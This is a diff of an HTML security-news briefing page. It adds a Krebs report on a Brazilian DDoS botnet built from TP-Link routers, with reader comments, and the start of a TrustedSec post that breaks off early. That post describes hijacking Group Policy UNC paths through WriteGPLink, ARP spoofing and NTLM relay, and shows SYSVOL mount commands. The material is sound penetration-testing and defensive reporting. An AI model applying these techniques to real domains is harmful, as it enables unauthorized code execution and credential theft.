@@ -59,84 +59,195 @@
         </style>
     </head>
     <body>
-        <h1>Security Briefing // 2026-04-30</h1>
+        <h1>Security Briefing // 2026-05-01</h1>
         <div class="menu">
-            <ul><li><button onclick="show('art-0')">8 best practices for CISOs conducting risk reviews</button></li><li><button onclick="show('art-1')">CISA orders feds to patch Windows flaw exploited as zero-day</button></li><li><button onclick="show('art-2')">CISA Adds Actively Exploited ConnectWise and Windows Flaws to KEV</button></li><li><button onclick="show('art-3')">CISA Adds Two Known Exploited Vulnerabilities to Catalog</button></li><li><button onclick="show('art-4')">CISA Adds 4 Exploited Flaws to KEV, Sets May 2026 Federal Deadline</button></li><li><button onclick="show('art-5')">Patch Tuesday, April 2026 Edition</button></li><li><button onclick="show('art-6')">Building a Detection Foundation: Part 5 - Correlation in Practice</button></li><li><button onclick="show('art-7')">The Proliferation of DarkSword: iOS Exploit Chain Adopted by Multiple Threat Actors</button></li><li><button onclick="show('art-8')">Microsoft Patch Tuesday, March 2026 Edition</button></li><li><button onclick="show('art-9')">Updates to the MSSQLHound OpenGraph Collector for BloodHound</button></li></ul>
+            <ul><li><button onclick="show('art-0')">US ransomware negotiators get 4 years in prison over BlackCat attacks</button></li><li><button onclick="show('art-1')">What’s new, updated, or recently released in Microsoft Security</button></li><li><button onclick="show('art-2')">Anti-DDoS Firm Heaped Attacks on Brazilian ISPs</button></li><li><button onclick="show('art-3')">ARP Around and Find Out: Hijacking GPO UNC Paths for Code Execution and NTLM Relay</button></li><li><button onclick="show('art-4')">CISA Adds Actively Exploited ConnectWise and Windows Flaws to KEV</button></li><li><button onclick="show('art-5')">CISA Adds Two Known Exploited Vulnerabilities to Catalog</button></li><li><button onclick="show('art-6')">CISA Adds 4 Exploited Flaws to KEV, Sets May 2026 Federal Deadline</button></li><li><button onclick="show('art-7')">Patch Tuesday, April 2026 Edition</button></li><li><button onclick="show('art-8')">The Proliferation of DarkSword: iOS Exploit Chain Adopted by Multiple Threat Actors</button></li><li><button onclick="show('art-9')">Updates to the MSSQLHound OpenGraph Collector for BloodHound</button></li></ul>
         </div>
         
         <div id="art-0" class="article-body">
-            <h2 class="article-title">8 best practices for CISOs conducting risk reviews</h2>
-            <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/04/29/8-best-practices-for-cisos-conducting-risk-reviews/" target="_blank">Original Link</a></p>
-            <div class="content-text">The Deputy CISO blog series is where [Microsoft Deputy Chief Information Security Officers](https://www.microsoft.com/en-us/security/blog/topic/office-of-the-ciso/) (CISOs) share their thoughts on what is most important in their respective domains. In this series, you will get practical advice, tactics to start (and stop) deploying, forward-looking commentary on where the industry is going, and more. In this blog, Rico Mariani, Deputy CISO for Microsoft Security Products, Research Infrastructure, and Engineering Systems shares some of his best practices and expertise in conducting risk reviews.
-[The nature of cyberthreats has never been static](https://www.microsoft.com/trust-center/security/secure-future-initiative/patterns-and-practices), but it’s hard to accurately convey the scale of their recent evolution and proliferation. As we’ve seen in many other arenas, AI has become a very powerful productivity tool for would-be cybercriminals. Between April 2024 and April 2025, Microsoft stopped $4 billion in fraud attempts.1 And as of the writing of the [Microsoft Digital Defense Report 2025](https://www.microsoft.com/corporate-responsibility/cybersecurity/microsoft-digital-defense-report-2025/), we are tracking 100 trillion security signals each day (a 40% increase since 2023).2
-This is why I decided to write a blog about risk reviews. By asking the right questions, risk reviews help us transform the utility of our security data from primarily reactive remediation and response information into key insights helping to inform our proactive security stances. And embracing strong proactive security is something we can all do to mitigate our increased exposure to security threats.
-Risk reviews are also a topic I’ve lent focus to during my first six months as Deputy CISO for Microsoft Security. It’s a very interesting role for me, as I’ve traditionally described myself as performance specialist and a systems specialist more than a security specialist. It’s not necessarily a distinction of skill set, but more one of mindset, and what I’d like to share with you is actually a bit of a synthesis of my inherent performance- and systems-first way of thinking and things I’ve brought into that practice after working with many of the other Microsoft Deputy CISOs over the last few months.
-There are roughly eight points I want to bring up concerning risk reviews in this blog. Each point has the potential to help expose potential security vulnerabilities when brought up with security teams. Together, they represent a structured and approachable way to initiate necessary conversations and drive meaningful results:
-- Assets
-- Applications
-- Authentication
-- Authorization
-- Network isolation
-- Detections
-- Auditing
-- Things not to miss
-Now, why did I choose to highlight these areas and not others? Generally, I find that looking at problems from the lens of risk management gives me a fresh perspective. When you very consistently ask specific questions around these areas, they often effectively start the conversation you want to have.
-Just one last thing before we dive in: What I’m about to tell you is only approximately correct. There will be edge cases and exceptions, but generally I think you’ll find this information helpful.
-1. Assets
-The best place to start a review is identifying the assets that you need to protect. This will largely define the scope of the review. A good place to find those assets is, of course, on your architecture diagrams and your threat models. The assets we’re talking about could be storage (where perhaps you’re storing sensitive or otherwise important data) or they could be highly-privileged applications like command-and-control systems or something similar. This is, in short, the list of things that your cyberattacker wants to get to.
-2. Applications
-In the next step, you identify your applications. These are, broadly speaking, the active part of your system. They are the outward-facing surfaces that customers will use and the set of microservices that support your interface. These systems could be providing any set of services that you might need—and herein lies the problem. It’s entirely normal for your applications to require access to your most important assets, but that means the applications themselves can become viable targets for a cyberattacker. So how do we make this situation better? At this point, it’s reasonable to start talking about possible controls.
-Read up on [Zero Trust for source code access](https://review.learn.microsoft.com/security/zero-trust/sfi/zero-trust-source-code-access).
-3. Good quality authentication
-The next thing you will want to inspect is the form of authentication that your system is using. The best systems are using tokens for authentication, and they are getting these tokens from standard token issuers like, for instance, [Microsoft Entra](https://www.microsoft.com/en-us/security/business/microsoft-entra). It’s sometimes viable to have your own token generation system, but remember that such systems tend to have bugs. Those bugs can be exploitable. And even lacking bugs, there could be, say, gaps or vulnerabilities in your token issuing system such that perhaps the tokens cannot be properly scoped. The tokens could also tend to be too long-lived, or difficult to be made fine-grained enough, or lack the capacity to allow for flowing user context from the request to the authorization system. Many such deficiencies are possible.
-Even with a good quality token issuing system, you can easily find yourself in a situation where the tokens that you’re creating are too fungible, or too powerful, or both. Thinking back to the assets you’re trying to protect and the applications that you have, you can likely categorize some of the applications as having more “power,” if you will, than others. Sometimes we call these “highly privileged applications” because they have the capability to do something that is especially of interest to cyberattackers, like reading a lot of data, changing configuration, or anything like that.
-To best manage the privileges associated with these applications, it needs to be the case that the kinds of tokens that they use are as limited as possible. So, a particular token might authorize a capability for a certain customer, on behalf of a certain user, for a certain set of data—and nothing more than that. When privileges are very generic, like “I can do this operation for anyone, anywhere,” things become much more dangerous. So, here the idea is to make sure that the tokens that you’re getting are very specific to the intent that you have and that only the applications that need those tokens can get them, and, again, the tokens are as limited as possible. This goes a long way in reducing the possible damage that a cyberattacker could do if they found such a token errantly stored somewhere.
-A lot of the things we think about when we’re working with tokens and trying to limit them fall into the category of limiting what a cyberattacker can do if they get a foothold somewhere. This is the [Zero Trust](https://www.microsoft.com/en-us/security/business/security-101/what-is-zero-trust-architecture) model, where you assume breach everywhere.
-Additionally, it’s essential to use standard libraries to accurately authenticate with tokens, so that all the aspects and limitations of the token are certain to be honored.
-Learn about [phishing-resistant multifactor authentication](https://learn.microsoft.com/security/zero-trust/sfi/phishing-resistant-mfa) from the Microsoft Secure Future Initiative (SFI).
-4. Good quality authorization
-Good quality tokens are not going to help you if they’re enforced poorly (or not at all). And bugs can creep into code. Ad hoc authorization code can render the good authentication that you’ve done moot.
-Any time you can use declarative style patterns that help you verify tokens against incoming APIs and the data that the client is attempting to access with your API, you’ll find yourself in a better place. Simple, consistent authorization yields fewer bugs and therefore less risk.
-5. Network isolation
-In addition to having good quality tokens, it’s important to isolate the pieces of your environment to the maximum extent possible. Again, this is done because it’s prudent to assume that a cyberattacker has a foothold somewhere in your network. The questions are “where exactly can that foothold be,” and “once they have that foothold, where in my network can they get to?” If a threat actor can reach any part of your system from any other part of your system, this is obviously less good than if your most sensitive systems can be accessed from exactly one or two key places and nowhere else. When properly controlled, most footholds become useless to a cyberattacker—or at least only indirectly useful.
-Use [service tags](https://learn.microsoft.com/en-us/azure/virtual-network/service-tags-overview) to create boundaries around your various assets such that applications are used by exactly those systems that are supposed to be using them and data is accessed by exactly those applications that are supposed to be accessing the data. This goes a long way to take many cyberthreats off the table.
-Network isolation can happen at several levels in the network stack. Popularly, level 7 is used at the perimeter. Maybe this manifests as some kind of HTTP proxy, for example, or an HTTP routing gateway. However, protection is incomplete without additional work happening at level 3 within your network. You want to limit IP traffic to be going to exactly the places that you want it to go. You might use techniques like virtual LANs, or similar constructs like network security groups (NSGs) in [Microsoft Azure](https://azure.microsoft.com/en-us). The idea is to limit connectivity to exactly what is necessary to do the job and not give the cyberattacker freedom to move around.
-With good network isolation comes the ability to log any attempts to gain access at the perimeter, and potentially even internally. Depending on what networking technology you’re using, all of this is great for hunting. We’ll talk about that in the next section.
-Learn more about [network isolation and other best practices from SFI](https://www.microsoft.com/security/blog/2025/10/07/new-microsoft-secure-future-initiative-sfi-patterns-and-practices-practical-guides-to-strengthen-security/).
-6. Detections
-It’s normal to think about monitoring for reliability. Systems need to stay within their operating parameters in the face of changes and external conditions. But it’s also important to think about detection from the perspective of your threat model. If you identify five or ten risks in your threat model that need controls, it’s useful to think about how you might detect if any of those things are actually happening in your environment.
-In this context, one place to look is at the perimeter—by examining your incoming HTTP traffic, for instance. But you can also look anywhere in your environment where you predict that attacks might happen. You might look for badly formatted requests, or fuzzing, or evidence of DDoS attack—whatever is appropriate to the risks you have. The idea is that you want to be able to create alerts if you have evidence of a threat actor operating in your estate.
-And, of course, security products can be very helpful here.
-7. Auditing
-We separate the notions of auditing from detection. Specifically, auditing is what I will call the pieces of data that you would use after a breach to determine the extent of the breach and the customers that were affected by it. In the event that you find a vulnerability without any evidence of threat actor exploitation, you’d want to go and check your auditing again to verify those claims. That way you can have evidence that whatever problem you found was not in fact exploited. If it was exploited, you’ll know to what extent, who was affected, and who needs to be notified.
-Some parts of your [endpoint detection and response (EDR)](https://www.microsoft.com/en-us/security/business/security-101/what-is-edr-endpoint-detection-response) stream will be very useful for auditing. Additional auditing information can come from the logs you create in your applications that record suitable information concerning recent activity.
-8. Things not to miss
-It’s important to think about all the applications and data that you have in your estate. For instance, it’s easy to overlook the backup data that you have stored. A cyberattacker might not be able to get access to your primary systems but might find that your backups are entirely unprotected and they can just read the backup.
-Similarly, support systems often go overlooked. There are frequently important [customer support scenarios](https://www.microsoft.com/en-us/security/blog/2025/10/15/the-importance-of-hardening-customer-support-tools-against-attack/) that require access, and it’s easy to fall into the trap of not giving those systems the highest level of scrutiny.
-We should add systems that are under development and test systems to this problematic set. In both these cases, the code that’s running those systems is less trustworthy than normal production code. Development code, for instance, can be presumed to have more bugs than production code. Some of those bugs might be authorization bugs. And if there are authorization bugs, that buggy code might provide access to important assets. Therefore, your plans should include even greater scrutiny when it comes to these kinds of systems.
-Explore [actionable patterns and practices from SFI](https://www.microsoft.com/trust-center/security/secure-future-initiative/patterns-and-practices).
-In summary
-If you’ve gotten as far as identifying all of your assets, all your applications, and then thinking about the access patterns and controls that you have between them—including authentication, authorization, network isolation, and the use of bug-resistant patterns—you’re in a pretty good place to write a risk summary that can guide your actions for many months. And we haven’t even touched on basic things like vulnerability management, security, bug management, and the usual software lifecycle things that are necessary to keep the system in good health. Combine all of the above and you should have a good-looking risk plan.
-Microsoft
-Deputy CISOs
-To hear more from Microsoft Deputy CISOs, check out the [OCISO blog series](https://www.microsoft.com/en-us/security/blog/topic/office-of-the-ciso/):
-To stay on top of important security industry updates, explore resources specifically designed for CISOs, and learn best practices for improving your organization’s security posture, join the [Microsoft CISO Digest distribution list](https://info.microsoft.com/ww-landing-subscribe-to-ciso-digest.html?lcid=en-us).
-To learn more about Microsoft Security solutions, visit our [website.](https://www.microsoft.com/en-us/security/business) Bookmark the [Security blog](https://www.microsoft.com/security/blog/) to keep up with our expert coverage on security matters. Also, follow us on LinkedIn ([Microsoft Security](https://www.linkedin.com/showcase/microsoft-security/)) and X ([@MSFTSecurity](https://twitter.com/@MSFTSecurity)) for the latest news and updates on cybersecurity.</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-1" class="article-body">
-            <h2 class="article-title">CISA orders feds to patch Windows flaw exploited as zero-day</h2>
-            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/cisa-orders-feds-to-patch-windows-flaw-exploited-in-zero-day-attacks/" target="_blank">Original Link</a></p>
-            <div class="content-text">The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has ordered federal agencies to secure their Windows systems against a vulnerability exploited in zero-day attacks. [...]
+            <h2 class="article-title">US ransomware negotiators get 4 years in prison over BlackCat attacks</h2>
+            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/us-ransomware-negotiators-get-4-years-in-prison-over-blackcat-attacks/" target="_blank">Original Link</a></p>
+            <div class="content-text">Two former employees of cybersecurity incident response companies Sygnia and DigitalMint were sentenced to four years in prison each for targeting U.S. companies in BlackCat (ALPHV) ransomware attacks. [...]
 
 [Full content could not be extracted. Visit source for details.]</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
+        <div id="art-1" class="article-body">
+            <h2 class="article-title">What’s new, updated, or recently released in Microsoft Security</h2>
+            <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/04/30/whats-new-updated-or-recently-released-in-microsoft-security/" target="_blank">Original Link</a></p>
+            <div class="content-text">New capabilities in Microsoft Agent 365; new Microsoft Defender and GitHub integration
+At Microsoft, security innovations are purpose-built to help every organization protect end-to-end with the speed and scale of AI. Our vision is simple: security should be ambient and autonomous, just like the AI it protects.
+In a world where AI agents can act autonomously to take action, access data, and interact across systems, every organization should have the confidence that their security posture can scale and keep pace with their AI investments. Microsoft is focused on helping organizations gain visibility into what their agents are doing, governance over what they’re allowed to do, and protection against emerging threats. With an AI-first, end-to-end security platform grounded in Zero Trust for AI, fueled by more than 100 trillion daily threat signals1, and shaped by the [Secure Future Initiative](https://www.microsoft.com/en-us/trust-center/security/secure-future-initiative), security and IT teams can harden their security posture with protection that is continuous, intelligent, and built for the agentic era.
+In the Loop is a new series from [Microsoft Security](https://www.microsoft.com/en-us/security) that delivers timely news and updates to the global security community. Today’s edition spotlights the latest capabilities designed to help security and IT teams secure their AI agents, secure their foundations, and defend against threats in real time with the powerful combination of agents and experts.
+New Microsoft Defender capabilities in Agent 365 tooling gateway
+Detect, block, and investigate threats to AI agents
+The [Agent 365](https://www.microsoft.com/en-us/microsoft-agent-365?msockid=3b984ce9af7a60fc00fd5be2ae466171) tooling gateway gives security teams the visibility and control they need to detect and respond to threats that target agentic workflows. New Microsoft Defender capabilities, now available in preview, enable security teams to detect, block and investigate anomalous behavior of their agents. Near real-time protection leverages webhooks to evaluate the actions an AI agent attempts to detect and block malicious or risky activities before they’re executed. [Read more](https://techcommunity.microsoft.com/blog/microsoftdefendercloudblog/defending-the-ai-era-new-microsoft-capabilities-to-protect-ai/4503885) and get started.
+AI-powered Defender and GitHub solution helps protect from code to runtime
+GitHub Advanced Security integration
+[Microsoft Defender for Cloud](https://www.microsoft.com/en-us/security/business/cloud-security/microsoft-defender-cloud?msockid=3b984ce9af7a60fc00fd5be2ae466171) integration with [GitHub Advanced Security](https://github.com/security/advanced-security), now generally available, provides unified security visibility across the development lifecycle. This integration automatically maps code changes to production environments, prioritizes security alerts based on real runtime context, and enables coordinated remediation workflows between development and security teams. Teams can track vulnerabilities from source code to deployed applications, focus on the security issues that affect production workloads, and take advantage of AI-powered remediation tools to speed resolution.2 [Get started today](https://aka.ms/SecureCodetoCloudBlog) and [watch the video](https://www.youtube.com/watch?v=q4nvbBpubOI).
+New demo: Run a data security investigation in Microsoft Purview
+Data Security Investigations
+Step into the role of a data security analyst and see how [Microsoft Purview Data Security Investigations](https://learn.microsoft.com/en-us/purview/data-security-investigations) helps you identify investigation‑relevant data, analyze it using AI‑powered deep content analysis, and mitigate sensitive data risks—all within a single, integrated solution. Follow the end‑to‑end investigation journey in this hands‑on demo.
+In the demo, you’ll learn how to:
+- Proactively assess data security risk across your data estate.
+- Reactively investigate data involved in security incidents, such as breaches, leaks, fraud, or bribery.
+- Visualize risk using the data risk graph, which shows correlations between sensitive content, users, and activities.
+Stay In the Loop
+Microsoft Security continually ships meaningful innovations across our portfolio and research-driven insights and reports for the security community. In the Loop posts are your reliable source of what’s new across Microsoft Security and what it means for your security strategy. Check back for the next drop and [connect with us at Microsoft Build](https://register.build.microsoft.com/flow/microsoft/build26/welcome/page/welcome), June 2-3, 2026 in San Francisco, to hear directly from Microsoft Security experts, learn more about today’s releases, and more.
+To learn more about Microsoft Security solutions, visit our [website](https://www.microsoft.com/en-us/security/business). Bookmark the [Security blog](https://www.microsoft.com/security/blog/) to keep up with our expert coverage on security matters. Also, follow us on LinkedIn ([Microsoft Security](https://www.linkedin.com/showcase/microsoft-security/)) and X ([@MSFTSecurity](https://twitter.com/@MSFTSecurity)) for the latest news and updates on cybersecurity.
+1[Microsoft Digital Defense Report 2025](https://cdn-dynmedia-1.microsoft.com/is/content/microsoftcorp/microsoft/msc/documents/presentations/CSR/Microsoft-Digital-Defense-Report-2025.pdf#page=1), Safeguarding Trust in the AI Era
+2[GitHub Advanced Security Integration with Microsoft Defender for Cloud](https://learn.microsoft.com/en-us/azure/defender-for-cloud/github-advanced-security-overview), Microsoft Defender for Cloud | Microsoft Learn</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
         <div id="art-2" class="article-body">
+            <h2 class="article-title">Anti-DDoS Firm Heaped Attacks on Brazilian ISPs</h2>
+            <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/04/anti-ddos-firm-heaped-attacks-on-brazilian-isps/" target="_blank">Original Link</a></p>
+            <div class="content-text">A Brazilian tech firm that specializes in protecting networks from distributed denial-of-service (DDoS) attacks has been enabling a botnet responsible for an extended campaign of massive DDoS attacks against other network operators in Brazil, KrebsOnSecurity has learned. The firm’s chief executive says the malicious activity resulted from a security breach and was likely the work of a competitor trying to tarnish his company’s public image.
+For the past several years, security experts have tracked a series of massive DDoS attacks originating from Brazil and solely targeting Brazilian ISPs. Until recently, it was less than clear who or what was behind these digital sieges. That changed earlier this month when a trusted source who asked to remain anonymous shared a curious file archive that was exposed in an open directory online.
+The exposed archive contained several Portuguese-language malicious programs written in Python. It also included the private [SSH authentication keys](https://www.sectigo.com/blog/what-is-an-ssh-key) belonging to the CEO of Huge Networks, a Brazilian ISP that primarily offers DDoS protection to other Brazilian network operators.
+Founded in Miami, Fla. in 2014, Huge Networks’s operations are centered in Brazil. The company originated from protecting game servers against DDoS attacks and evolved into an ISP-focused DDoS mitigation provider. It does not appear in any public abuse complaints and is not associated with any known [DDoS-for-hire services](https://krebsonsecurity.com/category/ddos-for-hire/).
+Nevertheless, the exposed archive shows that a Brazil-based threat actor maintained root access to Huge Networks infrastructure and built a powerful DDoS botnet by routinely mass-scanning the Internet for insecure Internet routers and unmanaged [domain name system (DNS)](http://compnetworking.about.com/od/dns_domainnamesystem/f/dns_servers.htm) servers on the Web that could be enlisted in attacks.
+DNS is what allows Internet users to reach websites by typing familiar domain names instead of the associated IP addresses. Ideally, DNS servers only provide answers to machines within a trusted domain. But so-called “DNS reflection” attacks rely on DNS servers that are (mis)configured to accept queries from anywhere on the Web. Attackers can send spoofed DNS queries to these servers so that the request appears to come from the target’s network. That way, when the DNS servers respond, they reply to the spoofed (targeted) address.
+By taking advantage of an extension to the DNS protocol that enables large DNS messages, botmasters can dramatically boost the size and impact of a reflection attack — crafting DNS queries so that the responses are much bigger than the requests. For example, an attacker could compose a DNS request of less than 100 bytes, prompting a response that is 60-70 times as large. This amplification effect is especially pronounced when the perpetrators can query many DNS servers with these spoofed requests from tens of thousands of compromised devices simultaneously.
+The exposed file archive includes [a command-line history](https://krebsonsecurity.com/wp-content/uploads/2026/04/bash-hist.txt) showing exactly how this attacker built and maintained a powerful botnet by scouring the Internet for TP-Link Archer AX21 routers. Specifically, the botnet seeks out TP-Link devices that remain vulnerable to [CVE-2023-1389](https://www.tp-link.com/us/support/faq/3643/), an unauthenticated command injection vulnerability that was patched back in April 2023.
+Malicious domains in the exposed Python attack scripts included DNS lookups for [hikylover[.]st](https://www.virustotal.com/gui/domain/hikylover.st/community), and [c.loyaltyservices[.]lol](https://bazaar.abuse.ch/sample/946709926db4a2c9a7768af3c6e621dfa79e6fd32560fb72fb2231528f19e0df/#intel), both domains that have been flagged in the past year as control servers for an Internet of Things (IoT) botnet powered by a [Mirai malware](https://en.wikipedia.org/wiki/Mirai_(malware)) variant.
+The leaked archive shows the botmaster coordinated their scanning from a Digital Ocean server that has been [flagged for abusive activity hundreds of times](https://www.abuseipdb.com/check/174.138.89.122) in the past year. The Python scripts invoke multiple Internet addresses assigned to Huge Networks that were used to identify targets and execute DDoS campaigns. The attacks were strictly limited to Brazilian IP address ranges, and the scripts show that each selected IP address prefix was attacked for 10-60 seconds with four parallel processes per host before the botnet moved on to the next target.
+The archive also shows these malicious Python scripts relied on private SSH keys belonging to Huge Networks’s CEO, Erick Nascimento. Reached for comment about the files, Mr. Nascimento said he did not write the attack programs and that he didn’t realize the extent of the DDoS campaigns until contacted by KrebsOnSecurity.
+“We received and notified many Tier 1 upstreams regarding very very large DDoS attacks against small ISPs,” Nascimento said. “We didn’t dig deep enough at the time, and what you sent makes that clear.”
+Nascimento said the unauthorized activity is likely related to a digital intrusion first detected in January 2026 that compromised two of the company’s development servers, as well as his personal SSH keys. But he said there’s no evidence those keys were used after January.
+“We notified the team in writing the same day, wiped the boxes, and rotated keys,” Nascimento said, sharing a screenshot of a January 11 notification from Digital Ocean. “All documented internally.”
+Mr. Nascimento said Huge Networks has since engaged a third-party network forensics firm to investigate further.
+“Our working assessment so far is that this all started with a single internal compromise — one pivot point that gave the attacker downstream access to some resources, including a legacy personal droplet of mine,” he wrote.
+“The compromise happened through a bastion/jump server that several people had access to,” Nascimento continued. “Digital Ocean flagged the droplet on January 11 — compromised due to a leaked SSH key, in their wording — I was traveling at the time and addressed it on return. That droplet was deprecated and destroyed, and it was never part of Huge Networks infrastructure.”
+The malicious software that powers the botnet of TP-Link devices used in the DDoS attacks on Brazilian ISPs is based on [Mirai](https://krebsonsecurity.com/?s=mirai), a malware strain that made its public debut in September 2016 by launching [a then record-smashing DDoS attack](https://krebsonsecurity.com/2016/09/krebsonsecurity-hit-with-record-ddos/) that kept this website [offline for four days](https://krebsonsecurity.com/2016/09/the-democratization-of-censorship/). In January 2017, KrebsOnSecurity [identified the Mirai authors](https://krebsonsecurity.com/2017/01/who-is-anna-senpai-the-mirai-worm-author/) as the co-owners of a DDoS mitigation firm that was using the botnet to attack gaming servers and scare up new clients.
+In May 2025, KrebsOnSecurity was hit by another Mirai-based DDoS that Google called [the largest attack it had ever mitigated](https://krebsonsecurity.com/2025/05/krebsonsecurity-hit-with-near-record-6-3-tbps-ddos/). That report implicated a 20-something Brazilian man who was running a DDoS mitigation company as well as several DDoS-for-hire services that have since been seized by the FBI.
+Nascimento flatly denied being involved in DDoS attacks against Brazilian operators to generate business for his company’s services.
+“We don’t run DDoS attacks against Brazilian operators to sell protection,” Nascimento wrote in response to questions. “Our sales model is mostly inbound and through channel integrator, distributors, partners — not active prospecting based on market incidents. The targets in the scripts you received are small regional providers, the vast majority of which are neither in our customer base nor in our commercial pipeline — a fact verifiable through public sources like [QRator](https://radar.qrator.net/as/264409).”
+Nascimento maintains he has “strong evidence stored on the blockchain” that this was all done by a competitor. As for who that competitor might be, the CEO wouldn’t say.
+“I would love to share this with you, but it could not be published as it would lose the surprise factor against my dishonest competitor,” he explained. “Coincidentally or not, your contact happened a week before an important event – one that this competitor has NEVER participated in (and it’s a traditional event in the sector). And this year, they will be participating. Strange, isn’t it?”
+Strange indeed.
+I’ve always wondered, how does a security company have a security breach?
+Hubris.
+Pobody’s nerfect ya know?
+“Nascimento maintains he has “strong evidence stored on the blockchain” that this was all done by a competitor.”
+basically an admission, honestly
+” firm that specializes in protecting networks from distributed denial-of-service (DDoS) ”
+It blows my mind that this exists as a ‘thing’. Like people/companies pay a separate company for this?
+The attack described above is simple to resolve when compared to SYN ACK, which is truly destructive, and no foreign cleaning tool effectively resolves it to keep the service running. Only two Brazilian companies have been efficiently cleaning this specific attack. ISPs have been suffering from this type of criminal activity since December 2024 and throughout 2025. The CEO can deny it all he wants, but simply talking to any ISP that suffered throughout that year will clarify many things.
+E quais seriam essas empresas
+Was waiting for this to happen
+Wondering how many ‘butterflies’ all us real smart folks have killed here in the Paleozoic. Bad news, people who think the time machine in 2024 is gonna save us. There is none, and it sure ain’t. Enjoying watching AI convince you all how smart you all are though.
+Time for another distributed denial of a planet.
+Good job, fake failures.
+depois que tivemos contrato com essa empresa(Huge), após o rompimento deste. Nunca mais tivemos paz
+Well, here in Brazil the most famous threat actor is Computize — they’ve hit a ton of small ISPs around the country.
+Eric, é você?
+Acho estranho falarem mal da Computize, porque a nossa experiência foi totalmente o contrário.
+Nós saímos da Huge e, depois de cancelarmos o contrato, começamos a sofrer ataques. Tivemos que contratar a Computize, e eles nos ajudaram a mitigar até que os ataques desapareceram.
+Hoje estamos sem proteção, mas uma coisa ficou clara para nós:
+Contratar a Huge foi como ficar refém.
+Eric, é você?
+Acho estranho falarem mal da Computize, porque a nossa experiência foi totalmente o contrário.
+Nós saímos da Huge e, depois de cancelarmos o contrato, começamos a sofrer ataques. Tivemos que contratar a Computize, e eles nos ajudaram a mitigar até que os ataques desapareceram.
+Hoje estamos sem proteção, mas uma coisa ficou clara para nós:
+Contratar a Huge foi como ficar refém.</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-3" class="article-body">
+            <h2 class="article-title">ARP Around and Find Out: Hijacking GPO UNC Paths for Code Execution and NTLM Relay</h2>
+            <p class="source-link">Source: TrustedSec | <a href="https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay" target="_blank">Original Link</a></p>
+            <div class="content-text">ARP Around and Find Out: Hijacking GPO UNC Paths for Code Execution and NTLM Relay
+Table of contents
+TL;DR - If you have WriteGPLink on an Active Directory Organizational Unit (OU) and you’re on the same network segment as a computer within that OU, you can abuse that permission to link an existing Group Policy Objects (GPO) with a software installation policy and ARP spoof the server it references, resulting in code execution as SYSTEM without modifying SYSVOL. More broadly, GPOs that reference UNC paths for drive maps, logon scripts, and startup scripts can be redirected to an attacker-controlled host for NTLMv2 capture. Furthermore, by deliberately disrupting SMB sessions, authentication can be forced to fall back to WebDAV, which sends NTLM over HTTP that can be relayed to services like LDAP(S), AD CS, and SMB.
+Introduction
+On engagements, it is common to find overly broad groups like Authenticated Users or Domain Computers with permissions over OUs that they were never intended to have. Whether it is left over from migration, a testing OU that never got cleaned up, or an AI-assisted auto-accept gone wrong, these misconfigurations frequently surface in BloodHound output. One (1) of the more interesting permissions that you may find is WriteGPLink, which indicates the principal has permission to modify the gPLink attribute of the targeted OU/domain node. This alone does not let you edit the GPO itself or create a new one, but it does let you find existing GPOs in the domain and force them to apply to the objects inside that OU.
+The concept of abusing GPO and OU relationships isn’t new. [wald0's foundational work on GPO attack primitives](https://wald0.com/?p=179) laid the groundwork, [WithSecure’s OU Having a Laugh](https://labs.withsecure.com/publications/ou-having-a-laugh) showed how OU attribute modification could be weaponized through rogue infrastructure, and Synacktiv’s [OUned.py](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory) provides automation for this style of abuse. The caveat is that these approaches usually depend on additional privileges such as creating machine accounts and adding DNS records. In tighter environments, those requirements may neutralize this path entirely.
+Those limitations led to me to a different approach. Instead of building malicious GPO infrastructure from scratch, WriteGPLink could be abused by taking advantage of software deployments that already exist in the environment. If a legitimate GPO contained a software installation policy pointing to a UNC path and you could ARP spoof a target computer into resolving to your host, then the target would process the linked policy on reboot and retrieve a malicious installer. This installer would then deploy as SYSTEM with no SYSVOL modification, machine account creation, or DNS record changes required.
+Digging through various GPO settings, it became clear that software installation was only one (1) of several GPO features that could be weaponized. Mapped drives, logon scripts, and startup scripts hosted on UNC paths all cause targets to reach out to remote servers during logon or policy processing. An attacker on the same broadcast domain can ARP spoof the target and impersonate the SMB connection. For drive mappings, this technique can capture NTLMv2 authentication as well as force a fallback to WebDAV that sends relayable NTLM over HTTP. For logon or startup scripts, it can allow replacement content to be served from the expected path and executed as the user or computer.
+For brevity, this blog assumes familiarity with core AD concepts and common offensive tooling. These attack paths are lengthy enough on their own, so the focus here is on the techniques, tooling used, and what worked.
+Attack 1: WriteGPLink + MSI Deployment Spoofing
+As with all offensive security, exercise caution, as incorrectly modifying settings such as a linked GPO can quickly cause unintended, widespread consequences across a domain.
+This chain assumes an authenticated position in the domain with the ability to collect BloodHound data and read from SYSVOL, as well as network adjacency to a computer contained within the target OU. BloodHound data shows this edge where the low-privileged user coby@woke.local has WriteGPLink over the CoolComputers OU. This OU contains WIN11-WOKE.WOKE.LOCAL.
+Once this edge is identified, the next step is reviewing SYSVOL to find an existing GPO worth linking. SYSVOL is readable by any authenticated user and can be cloned with tools such as smbclient or rsync.
+mkdir -p /mnt/$DOMAIN/SYSVOL/
+mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
+rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
